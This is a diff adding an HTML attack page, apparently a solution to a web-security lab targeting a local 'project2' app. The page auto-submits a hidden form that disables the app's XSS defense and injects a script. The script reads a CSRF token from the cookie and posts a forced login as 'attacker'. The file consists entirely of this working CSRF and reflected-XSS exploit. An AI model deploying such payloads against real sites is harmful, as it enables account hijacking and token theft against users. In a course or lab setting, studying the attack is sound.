@@ -1,0 +1,16 @@
+<html>
+    <body>
+        <iframe style="display: none" name="csrf-part1"></iframe>
+        <form target = "csrf-part1" method ="GET" action="http://localhost/project2/search" id="csrf-part1" style="display: none">
+            <input name="xssdefense" value="0">
+            <input name="q" value="<script> 
+                $.ajax({
+                    type: 'POST',
+                    url: 'http://localhost/project2/login',
+                    data: {'username':'attacker', 'password':'l33th4x', 'csrf_token': document.cookie.slice(40,72)}
+                })
+                </script>">
+        </form>
+        <script> document.getElementById("csrf-part1").submit() </script>
+    </body>
+</html>
